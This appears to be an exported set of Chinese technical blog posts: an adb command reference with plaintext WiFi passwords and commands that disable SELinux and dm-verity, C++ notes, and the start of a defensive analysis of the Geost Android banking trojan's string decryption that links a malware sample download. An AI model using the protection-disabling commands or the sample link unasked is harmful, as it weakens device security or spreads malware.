<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">network=&#123;</span><br><span class="line">	ssid=<span class="string">&quot;TP-LINK_9DFC&quot;</span></span><br><span class="line">	scan_ssid=1</span><br><span class="line">	psk=<span class="string">&quot;123456789&quot;</span></span><br><span class="line">	key_mgmt=WPA-PSK</span><br><span class="line">	group=CCMP TKIP</span><br><span class="line">	auth_alg=OPEN</span><br><span class="line">	sim_num=1</span><br><span class="line">	priority=13893</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">network=&#123;</span><br><span class="line">	ssid=<span class="string">&quot;TP-LINK_F11E&quot;</span></span><br><span class="line">	psk=<span class="string">&quot;987654321&quot;</span></span><br><span class="line">	key_mgmt=WPA-PSK</span><br><span class="line">	sim_num=1</span><br><span class="line">	priority=17293</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ssid</code> 即为我们在 WLAN 设置里看到的名称，<code>psk</code> 为密码，<code>key_mgmt</code> 为安全加密方式。</p>
<h3 id="设置系统日期和时间"><a href="#设置系统日期和时间" class="headerlink" title="设置系统日期和时间"></a>设置系统日期和时间</h3><p><strong>注：需要 root 权限。</strong></p>
<p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line"><span class="built_in">date</span> -s 20160823.131500</span><br></pre></td></tr></table></figure>

<p>表示将系统日期和时间更改为 2016 年 08 月 23 日 13 点 15 分 00 秒。</p>
<h3 id="重启手机"><a href="#重启手机" class="headerlink" title="重启手机"></a>重启手机</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb reboot</span><br></pre></td></tr></table></figure>

<h3 id="检测设备是否已-root"><a href="#检测设备是否已-root" class="headerlink" title="检测设备是否已 root"></a>检测设备是否已 root</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br></pre></td></tr></table></figure>

<p>此时命令行提示符是 <code>$</code> 则表示没有 root 权限，是 <code>#</code> 则表示已 root。</p>
<h3 id="使用-Monkey-进行压力测试"><a href="#使用-Monkey-进行压力测试" class="headerlink" title="使用 Monkey 进行压力测试"></a>使用 Monkey 进行压力测试</h3><p>Monkey 可以生成伪随机用户事件来模拟单击、触摸、手势等操作，可以对正在开发中的程序进行随机压力测试。</p>
<p>简单用法：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell monkey -p &lt;packagename&gt; -v 500</span><br></pre></td></tr></table></figure>

<p>表示向 <code>&lt;packagename&gt;</code> 指定的应用程序发送 500 个伪随机事件。</p>
<p>Monkey 的详细用法参考 <a href="https://developer.android.com/studio/test/monkey.html">官方文档</a>。</p>
<h3 id="开启-x2F-关闭-WiFi"><a href="#开启-x2F-关闭-WiFi" class="headerlink" title="开启&#x2F;关闭 WiFi"></a>开启&#x2F;关闭 WiFi</h3><p><strong>注：需要 root 权限。</strong></p>
<p>有时需要控制设备的 WiFi 状态，可以用以下指令完成。</p>
<p>开启 WiFi：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb shell svc wifi <span class="built_in">enable</span></span><br></pre></td></tr></table></figure>

<p>关闭 WiFi：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb shell svc wifi <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>

<p>若执行成功，输出为空；若未取得 root 权限执行此命令，将执行失败，输出 <code>Killed</code>。</p>
<h2 id="刷机相关命令"><a href="#刷机相关命令" class="headerlink" title="刷机相关命令"></a>刷机相关命令</h2><h3 id="重启到-Recovery-模式"><a href="#重启到-Recovery-模式" class="headerlink" title="重启到 Recovery 模式"></a>重启到 Recovery 模式</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb reboot recovery</span><br></pre></td></tr></table></figure>

<h3 id="从-Recovery-重启到-Android"><a href="#从-Recovery-重启到-Android" class="headerlink" title="从 Recovery 重启到 Android"></a>从 Recovery 重启到 Android</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb reboot</span><br></pre></td></tr></table></figure>

<h3 id="重启到-Fastboot-模式"><a href="#重启到-Fastboot-模式" class="headerlink" title="重启到 Fastboot 模式"></a>重启到 Fastboot 模式</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure>

<h3 id="通过-sideload-更新系统"><a href="#通过-sideload-更新系统" class="headerlink" title="通过 sideload 更新系统"></a>通过 sideload 更新系统</h3><p>如果我们下载了 Android 设备对应的系统更新包到电脑上，那么也可以通过 adb 来完成更新。</p>
<p>以 Recovery 模式下更新为例：</p>
<ol>
<li><p>重启到 Recovery 模式。</p>
<p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb reboot recovery</span><br></pre></td></tr></table></figure>
</li>
<li><p>在设备的 Recovery 界面上操作进入 <code>Apply update</code>-<code>Apply from ADB</code>。</p>
<p>注：不同的 Recovery 菜单可能与此有差异，有的是一级菜单就有 <code>Apply update from ADB</code>。</p>
</li>
<li><p>通过 adb 上传和更新系统。</p>
<p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb sideload &lt;path-to-update.zip&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="安全相关命令"><a href="#安全相关命令" class="headerlink" title="安全相关命令"></a>安全相关命令</h2><h3 id="启用-x2F-禁用-SELinux"><a href="#启用-x2F-禁用-SELinux" class="headerlink" title="启用&#x2F;禁用 SELinux"></a>启用&#x2F;禁用 SELinux</h3><p>启用 SELinux</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb shell setenforce 1</span><br></pre></td></tr></table></figure>

<p>禁用 SELinux</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb shell setenforce 0</span><br></pre></td></tr></table></figure>

<h3 id="启用-x2F-禁用-dm-verity"><a href="#启用-x2F-禁用-dm-verity" class="headerlink" title="启用&#x2F;禁用 dm_verity"></a>启用&#x2F;禁用 dm_verity</h3><p>启用 dm_verity</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb enable-verity</span><br></pre></td></tr></table></figure>

<p>禁用 dm_verity</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb disable-verity</span><br></pre></td></tr></table></figure>

<h2 id="更多-adb-shell-命令"><a href="#更多-adb-shell-命令" class="headerlink" title="更多 adb shell 命令"></a>更多 adb shell 命令</h2><p>Android 系统是基于 Linux 内核的，所以 Linux 里的很多命令在 Android 里也有相同或类似的实现，在 <code>adb shell</code> 里可以调用。本文档前面的部分内容已经用到了 <code>adb shell</code> 命令。</p>
<h3 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell ps</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">USER     PID   PPID  VSIZE  RSS     WCHAN    PC        NAME</span><br><span class="line">root      1     0     8904   788   ffffffff 00000000 S /init</span><br><span class="line">root      2     0     0      0     ffffffff 00000000 S kthreadd</span><br><span class="line">...</span><br><span class="line">u0_a71    7779  5926  1538748 48896 ffffffff 00000000 S com.sohu.inputmethod.sogou:classic</span><br><span class="line">u0_a58    7963  5926  1561916 59568 ffffffff 00000000 S org.mazhuang.boottimemeasure</span><br><span class="line">...</span><br><span class="line">shell     8750  217   10640  740   00000000 b6f28340 R ps</span><br></pre></td></tr></table></figure>

<p>各列含义：</p>
<table>
<thead>
<tr>
<th>列名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>USER</td>
<td>所属用户</td>
</tr>
<tr>
<td>PID</td>
<td>进程 ID</td>
</tr>
<tr>
<td>PPID</td>
<td>父进程 ID</td>
</tr>
<tr>
<td>NAME</td>
<td>进程名</td>
</tr>
</tbody></table>
<h3 id="查看实时资源占用情况"><a href="#查看实时资源占用情况" class="headerlink" title="查看实时资源占用情况"></a>查看实时资源占用情况</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell top</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">User 0%, System 6%, IOW 0%, IRQ 0%</span><br><span class="line">User 3 + Nice 0 + Sys 21 + Idle 280 + IOW 0 + IRQ 0 + SIRQ 3 = 307</span><br><span class="line"></span><br><span class="line">  PID PR CPU% S  <span class="comment">#THR     VSS     RSS PCY UID      Name</span></span><br><span class="line"> 8763  0   3% R     1  10640K   1064K  <span class="built_in">fg</span> shell    top</span><br><span class="line">  131  0   3% S     1      0K      0K  <span class="built_in">fg</span> root     dhd_dpc</span><br><span class="line"> 6144  0   0% S   115 1682004K 115916K  <span class="built_in">fg</span> system   system_server</span><br><span class="line">  132  0   0% S     1      0K      0K  <span class="built_in">fg</span> root     dhd_rxf</span><br><span class="line"> 1731  0   0% S     6  20288K    788K  <span class="built_in">fg</span> root     /system/bin/mpdecision</span><br><span class="line">  217  0   0% S     6  18008K    356K  <span class="built_in">fg</span> shell    /sbin/adbd</span><br><span class="line"> ...</span><br><span class="line"> 7779  2   0% S    19 1538748K  48896K  <span class="built_in">bg</span> u0_a71   com.sohu.inputmethod.sogou:classic</span><br><span class="line"> 7963  0   0% S    18 1561916K  59568K  <span class="built_in">fg</span> u0_a58   org.mazhuang.boottimemeasure</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>

<p>各列含义：</p>
<table>
<thead>
<tr>
<th>列名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>PID</td>
<td>进程 ID</td>
</tr>
<tr>
<td>PR</td>
<td>优先级</td>
</tr>
<tr>
<td>CPU%</td>
<td>当前瞬间占用 CPU 百分比</td>
</tr>
<tr>
<td>S</td>
<td>进程状态（R&#x3D;运行，S&#x3D;睡眠，T&#x3D;跟踪&#x2F;停止，Z&#x3D;僵尸进程）</td>
</tr>
<tr>
<td>#THR</td>
<td>线程数</td>
</tr>
<tr>
<td>VSS</td>
<td>Virtual Set Size 虚拟耗用内存（包含共享库占用的内存）</td>
</tr>
<tr>
<td>RSS</td>
<td>Resident Set Size 实际使用物理内存（包含共享库占用的内存）</td>
</tr>
<tr>
<td>PCY</td>
<td>调度策略优先级，SP_BACKGROUND&#x2F;SPFOREGROUND</td>
</tr>
<tr>
<td>UID</td>
<td>进程所有者的用户 ID</td>
</tr>
<tr>
<td>NAME</td>
<td>进程名</td>
</tr>
</tbody></table>
<p><code>top</code> 命令还支持一些命令行参数，详细用法如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Usage: top [ -m max_procs ] [ -n iterations ] [ -d delay ] [ -s sort_column ] [ -t ] [ -h ]</span><br><span class="line">    -m num  最多显示多少个进程</span><br><span class="line">    -n num  刷新多少次后退出</span><br><span class="line">    -d num  刷新时间间隔（单位秒，默认值 5）</span><br><span class="line">    -s col  按某列排序（可用 col 值：cpu, vss, rss, thr）</span><br><span class="line">    -t      显示线程信息</span><br><span class="line">    -h      显示帮助文档</span><br></pre></td></tr></table></figure>

<h3 id="查看进程-UID"><a href="#查看进程-UID" class="headerlink" title="查看进程 UID"></a>查看进程 UID</h3><p>有两种方案：</p>
<ol>
<li><p><code>adb shell dumpsys package &lt;packagename&gt; | grep userId=</code></p>
<p>如：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ adb shell dumpsys package org.mazhuang.guanggoo | grep userId=</span><br><span class="line">   userId=10394</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过 ps 命令找到对应进程的 pid 之后 <code>adb shell cat /proc/&lt;pid&gt;/status | grep Uid</code></p>
<p>如：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ adb shell</span><br><span class="line">gemini:/ $ ps | grep org.mazhuang.guanggoo</span><br><span class="line">u0_a394   28635 770   1795812 78736 SyS_epoll_ 0000000000 S org.mazhuang.guanggoo</span><br><span class="line">gemini:/ $ <span class="built_in">cat</span> /proc/28635/status | grep Uid</span><br><span class="line">Uid:    10394   10394   10394   10394</span><br><span class="line">gemini:/ $</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>如下是其它常用命令的简单描述，前文已经专门讲过的命令不再额外说明：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>cat</td>
<td>显示文件内容</td>
</tr>
<tr>
<td>cd</td>
<td>切换目录</td>
</tr>
<tr>
<td>chmod</td>
<td>改变文件的存取模式&#x2F;访问权限</td>
</tr>
<tr>
<td>df</td>
<td>查看磁盘空间使用情况</td>
</tr>
<tr>
<td>grep</td>
<td>过滤输出</td>
</tr>
<tr>
<td>kill</td>
<td>杀死指定 PID 的进程</td>
</tr>
<tr>
<td>ls</td>
<td>列举目录内容</td>
</tr>
<tr>
<td>mount</td>
<td>挂载目录的查看和管理</td>
</tr>
<tr>
<td>mv</td>
<td>移动或重命名文件</td>
</tr>
<tr>
<td>ps</td>
<td>查看正在运行的进程</td>
</tr>
<tr>
<td>rm</td>
<td>删除文件</td>
</tr>
<tr>
<td>top</td>
<td>查看进程的资源占用情况</td>
</tr>
</tbody></table>
<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="启动-adb-server-失败"><a href="#启动-adb-server-失败" class="headerlink" title="启动 adb server 失败"></a>启动 adb server 失败</h3><p><strong>出错提示</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">error: protocol fault (couldn<span class="string">&#x27;t read status): No error</span></span><br></pre></td></tr></table></figure>

<p><strong>可能原因</strong></p>
<p>adb server 进程想使用的 5037 端口被占用。</p>
<p><strong>解决方案</strong></p>
<p>找到占用 5037 端口的进程，然后终止它。以 Windows 下为例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">netstat -ano | findstr LISTENING</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">TCP    0.0.0.0:5037           0.0.0.0:0              LISTENING       1548</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>这里 1548 即为进程 ID，用命令结束该进程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">taskkill /PID 1548</span><br></pre></td></tr></table></figure>

<p>然后再启动 adb 就没问题了。</p>
<h3 id="com-android-ddmlib-AdbCommandRejectedException"><a href="#com-android-ddmlib-AdbCommandRejectedException" class="headerlink" title="com.android.ddmlib.AdbCommandRejectedException"></a>com.android.ddmlib.AdbCommandRejectedException</h3><p>在 Android Studio 里新建一个模拟器，但是用 adb 一直连接不上，提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.android.ddmlib.AdbCommandRejectedException: device unauthorized.</span><br><span class="line">This adb server&#x27;s $ADB_VENDOR_KEYS is not set</span><br><span class="line">Try &#x27;adb kill-server&#x27; if that seems wrong.</span><br><span class="line">Otherwise check for a confirmation dialog on your device.</span><br></pre></td></tr></table></figure>

<p>在手机上安装一个终端然后执行 su 提示没有该命令，这不正常。</p>
<p>于是删除该模拟器后重新下载安装一次，这次就正常了。</p>
<h2 id="adb-的非官方实现"><a href="#adb-的非官方实现" class="headerlink" title="adb 的非官方实现"></a>adb 的非官方实现</h2><ul>
<li><a href="https://github.com/facebook/fb-adb">fb-adb</a> - A better shell for Android devices (for Mac).</li>
</ul>
<h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h2><ul>
<li><a href="./related/aapt.md">aapt</a></li>
<li><a href="./related/am.md">am</a></li>
<li><a href="./related/dumpsys.md">dumsys</a></li>
<li><a href="./related/pm.md">pm</a></li>
<li><a href="./related/uiautomator.md">uiautomator</a></li>
</ul>
<h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>感谢朋友们无私的分享与补充（排名不分先后）。</p>
<p><a href="https://github.com/zxning">zxning</a>，<a href="https://github.com/linhua55">linhua55</a>，<a href="https://github.com/codeskyblue">codeskyblue</a>，<a href="https://github.com/seasonyuu">seasonyuu</a>，<a href="https://github.com/fan123199">fan123199</a>，<a href="https://github.com/zhEdward">zhEdward</a>，<a href="https://github.com/0x8BADFOOD">0x8BADFOOD</a>，<a href="https://github.com/keith666666">keith666666</a>，<a href="https://github.com/shawnlinboy">shawnlinboy</a>，<a href="https://github.com/s-xq">s-xq</a>，<br><a href="https://github.com/lucky9322">lucky9322</a>。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://developer.android.com/studio/command-line/adb.html">Android Debug Bridge</a></li>
<li><a href="https://developer.android.com/studio/command-line/shell.html">ADB Shell Commands</a></li>
<li><a href="https://developer.android.com/studio/command-line/logcat.html">logcat Command-line Tool</a></li>
<li><a href="http://zmywly8866.github.io/2015/01/24/all-adb-command.html">Android ADB命令大全</a></li>
<li><a href="https://github.com/ZQiang94/StudyRecords/blob/master/other/src/main/java/com/other/adb%20%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95.md">adb 命令行的使用记录</a></li>
<li><a href="http://www.jianshu.com/p/860bc2bf1a6a">Android ADB命令大全(通过ADB命令查看wifi密码、MAC地址、设备信息、操作文件、查看文件、日志信息、卸载、启动和安装APK等)</a></li>
<li><a href="http://yifeiyuan.me/2016/06/30/ADB%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/">那些做Android开发必须知道的ADB命令</a></li>
<li><a href="http://blog.csdn.net/kittyboy0001/article/details/38562515">adb shell top</a></li>
<li><a href="http://cabins.github.io/2016/03/25/UseAdbLikeAPro-2/">像高手一样使用ADB命令行（2）</a></li>
</ul>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>adb</tag>
      </tags>
  </entry>
  <entry>
    <title>c++使用记录</title>
    <url>/2019/12/20/c-%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="C-名称粉碎使用-C-filt-工具恢复"><a href="#C-名称粉碎使用-C-filt-工具恢复" class="headerlink" title="C++ 名称粉碎使用 C++filt 工具恢复"></a><code>C++</code> 名称粉碎使用 <code>C++filt</code> 工具恢复</h1><p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ c++filt _Z3addii</span><br><span class="line">add(int, int)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="判断编译平台宏定义"><a href="#判断编译平台宏定义" class="headerlink" title="判断编译平台宏定义"></a>判断编译平台宏定义</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN32</span></span><br><span class="line">   <span class="comment">//define something for Windows (32-bit and 64-bit, this part is common)</span></span><br><span class="line">   <span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">      <span class="comment">//define something for Windows (64-bit only)</span></span><br><span class="line">   <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="comment">//define something for Windows (32-bit only)</span></span><br><span class="line">   <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> __APPLE__</span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;TargetConditionals.h&quot;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> TARGET_IPHONE_SIMULATOR</span></span><br><span class="line">         <span class="comment">// iOS Simulator</span></span><br><span class="line">    <span class="meta">#<span class="keyword">elif</span> TARGET_OS_IPHONE</span></span><br><span class="line">        <span class="comment">// iOS device</span></span><br><span class="line">    <span class="meta">#<span class="keyword">elif</span> TARGET_OS_MAC</span></span><br><span class="line">        <span class="comment">// Other kinds of Mac OS</span></span><br><span class="line">    <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="meta">#   <span class="keyword">error</span> <span class="string">&quot;Unknown Apple platform&quot;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> __ANDROID__</span></span><br><span class="line">    <span class="comment">// android</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> __linux__</span></span><br><span class="line">    <span class="comment">// linux</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> __unix__ <span class="comment">// all unices not caught above</span></span></span><br><span class="line">    <span class="comment">// Unix</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(_POSIX_VERSION)</span></span><br><span class="line">    <span class="comment">// POSIX</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#   <span class="keyword">error</span> <span class="string">&quot;Unknown compiler&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h1 id="error-C2027-use-of-undefined-type"><a href="#error-C2027-use-of-undefined-type" class="headerlink" title="error C2027: use of undefined type"></a>error C2027: use of undefined type</h1><p>当遇到这种问题时， 将实现写到 cpp 文件中。</p>
<p>例如:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># builder.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Burger</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BurgerBuilder</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">float</span> size;</span><br><span class="line">	<span class="type">bool</span> cheese = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">bool</span> pepperoni = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">bool</span> lettuce = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">bool</span> tomato = <span class="literal">false</span>;</span><br><span class="line">	<span class="built_in">BurgerBuilder</span>(<span class="type">float</span> size) : <span class="built_in">size</span>(size) &#123;&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function">Burger* <span class="title">build</span><span class="params">()</span></span>; </span><br><span class="line">    <span class="comment">// 将下列的实现代码写到 cpp 文件中，否则会报 error C2027: use of undefined type 错误。</span></span><br><span class="line">	<span class="comment">// &#123;</span></span><br><span class="line">	<span class="comment">// 	return new Burger(this);</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Burger</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">float</span> size;</span><br><span class="line">	<span class="type">bool</span> cheese = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">bool</span> pepperoni = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">bool</span> lettuce = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">bool</span> tomato = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Burger</span>(BurgerBuilder* builder) &#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;size = builder-&gt;size;</span><br><span class="line">		<span class="keyword">this</span>-&gt;cheese = builder-&gt;cheese;</span><br><span class="line">		<span class="keyword">this</span>-&gt;pepperoni = builder-&gt;pepperoni;</span><br><span class="line">		<span class="keyword">this</span>-&gt;lettuce = builder-&gt;lettuce;</span><br><span class="line">		<span class="keyword">this</span>-&gt;tomato = builder-&gt;tomato;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// builder.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Builder.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">Burger* <span class="title">BurgerBuilder::build</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Burger</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="https://stackoverflow.com/questions/33964994/error-c2027-use-of-undefined-type-how-to-declare-class">https://stackoverflow.com/questions/33964994/error-c2027-use-of-undefined-type-how-to-declare-class</a></p>
</blockquote>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>dexsim插件-Geost</title>
    <url>/2020/03/13/dexsim%E6%8F%92%E4%BB%B6-Geost/</url>
    <content><![CDATA[<p>最近分析Geost家族银行木马，记录一下该木马字符串解密插件编写。</p>
<blockquote>
<p>样本来源：<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/dissecting-geost-exposing-the-anatomy-of-the-android-trojan-targeting-russian-banks/">https://blog.trendmicro.com/trendlabs-security-intelligence/dissecting-geost-exposing-the-anatomy-of-the-android-trojan-targeting-russian-banks/</a></p>
</blockquote>
<p><a href="dexsim%E6%8F%92%E4%BB%B6-Geost/92394e82d9cf5de5cb9c7ac072e774496bd1c7e2944683837d30b188804c1810">样本下载</a></p>
<h1 id="分析字符串解密特点"><a href="#分析字符串解密特点" class="headerlink" title="分析字符串解密特点"></a>分析字符串解密特点</h1><p>首先查看样本中解密字符串方法的特点</p>
<img src="/2020/03/13/dexsim%E6%8F%92%E4%BB%B6-Geost/2020-03-13-14-51-04.png" class="">

<p>可以发现解密字符串函数为 <code>Lcom/rgamtgid/hnsolues/QLwdDnU;-&gt;UGanmSarY([B)[B</code> , 此代码的特征为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fill-array-data v2, :array_2e</span><br><span class="line">invoke-virtual &#123;p0, v2&#125;, Lcom/rgamtgid/hnsolues/QLwdDnU;-&gt;UGanmSarY([B)[B</span><br><span class="line">move-result-object v2</span><br><span class="line">invoke-direct &#123;v1, v2&#125;, Ljava/lang/String;-&gt;&lt;init&gt;([B)V</span><br></pre></td></tr></table></figure>

<p>对应的正则表达式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r&#x27;fill-array-data v\d+, :(\w+)\s+?&#x27;</span><br><span class="line">r&#x27;invoke-virtual &#123;p0, v\d&#125;, (.*?);-&gt;(.*?)\(\[B\)\[B\s+?&#x27;</span><br><span class="line">r&#x27;move-result-object v\d+\s+?&#x27;</span><br><span class="line">r&#x27;invoke-direct &#123;(v\d+), v\d+&#125;, Ljava/lang/String;-&gt;&lt;init&gt;\(\[B\)V&#x27;</span><br></pre></td></tr></table></figure>

<p>继续观察<code>Lcom/rgamtgid/hnsolues/QLwdDnU;-&gt;UGanmSarY([B)[B</code> 函数，发现该函数为非静态函数，需要先调用函数所在类的构造函数，然后再调用该解密函数，并且该函数返回值为 <code>byte[]</code> , 需要转成 <code>String</code> 类型, 所以需要修改 <code>dss</code> 相关代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Object obj = null;</span><br><span class="line">try&#123;</span><br><span class="line">    Constructor&lt;?&gt; con = clz.getConstructor();</span><br><span class="line">    obj = con.newInstance();</span><br><span class="line">&#125;catch (Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">ret = mtd.invoke(obj, target.getParameters());</span><br><span class="line">result = new String((byte[])ret);</span><br></pre></td></tr></table></figure>
<p>开始解密，发现解密结果为乱码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;f2e3d508ee217c095861d260a3a9eee8f61603ed045bb4817fd28a7da11b3d9f&quot;: [&quot;ġ��\\u001D3\\u0002��&quot;],</span><br><span class="line">	&quot;38a80467b6d5b816cd91776ed8e51cce0df8a73d46bd47b7d188d1d84eaa678f&quot;: [&quot;ˮ��\\u0019(\\u0003&quot;],</span><br><span class="line">	&quot;b4e499760697584cc82d02559489ce6a99e497ab066d1a2b34a33cbfce943193&quot;: [&quot;���&quot;],</span><br><span class="line">	&quot;70216d6f207a1c0e370b7113334d14e9ebb12c766568369eda1a1f8afee15fc7&quot;: [&quot;����\\u0019,\\u0006���i�&quot;],</span><br><span class="line">	&quot;d1cdc906ab0b7c1c64a29537e9c4020f52790b0ac1e5045eaf321e9bbfe14d6f&quot;: [&quot;Δ��\\u0005!\\u0000��n�&quot;],</span><br><span class="line">	&quot;d0532ef95194e0763b588f5b2ac1304c5f15333bfda545f929b3c0a8885643c3&quot;: [&quot;ŭ��\\u001D&quot;],</span><br><span class="line">	&quot;df2641fd22aa51c58d5150e925d75b797dac6cdd9491950a912b8c4230e22836&quot;: [&quot;ġ��\\u00072&quot;],</span><br><span class="line">	&quot;1c3fbc0ef0a73334f447ceb1e6eeb53afc8d38c5e054d4ceaef30ccd828b4ff3&quot;: [&quot;ʪ��\\u0007!\\u000B&quot;],</span><br><span class="line">	&quot;1a9a46b987f24ecf7d3be2e6501c7b6622d169a7af407a9e31ef0337bc0141d6&quot;: [&quot;ǥ��\\u0007+I��|����;o�xl���\\u0003b6�&quot;],</span><br><span class="line">	&quot;ff3cb5db4c0284f1bfe203fee5804cd6724267b24ee7d9596f775cd5eead7c2e&quot;: [&quot;ġ��\\u0001.\\u0014��k���&quot;],</span><br><span class="line">	